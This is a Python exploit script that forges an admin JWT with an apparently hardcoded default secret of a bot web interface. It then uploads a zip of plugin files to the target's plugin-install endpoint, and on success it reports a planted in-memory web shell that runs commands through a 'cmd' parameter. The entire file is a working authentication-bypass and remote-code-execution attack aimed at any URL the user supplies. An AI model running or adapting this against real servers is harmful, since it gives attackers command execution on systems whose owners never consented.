import os
import zipfile
import requests
import uuid
from pathlib import Path
import argparse
import datetime

import jwt

WEBUI_SK = "Advanced_System_for_Text_Response_and_Bot_Operations_Tool"

payload = {
    "username": "114514",
    "exp": datetime.datetime.utcnow() + datetime.timedelta(days=30),
}
token = jwt.encode(payload, WEBUI_SK, algorithm="HS256")

headers = {
    "Authorization": "Bearer " + token
}


def create_zip():
    name = str(uuid.uuid4())
    zip_path = Path(f"{name}.zip")

    base_dir = "payload-zip-main"
    files = ["metadata.yaml", "main.py", "LICENSE", "README.md"]

    with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zipf:

        zinfo = zipfile.ZipInfo(name + "/")
        zipf.writestr(zinfo, "")

        # Add each file
        for fname in files:
            zipf.write(os.path.join(base_dir, fname), arcname=os.path.join(name, fname))
    zip_payload_bytes = zip_path.read_bytes()
    zip_path.unlink()
    return zip_payload_bytes, name


def main():
    parser = argparse.ArgumentParser(
        description="Upload a zip payload to a specified URL."
    )
    parser.add_argument("url", help="Target URL (e.g., http://127.0.0.1:xxxx)")
    args = parser.parse_args()

    url = args.url
    print(url)
    zip_payload_bytes, name = create_zip()

    resp = requests.post(
        url + "/api/plugin/install-upload",
        headers=headers,
        files={"file": (name + "-main.zip", zip_payload_bytes)},
        timeout=20,
        verify=False,
    )

    try:
        data = resp.json()
        if data.get("status") == "ok":
            print("created a memshell at: " + url + "/test_memshell?cmd=id")
    except Exception:
        print("network failed")


if __name__ == "__main__":
    main()
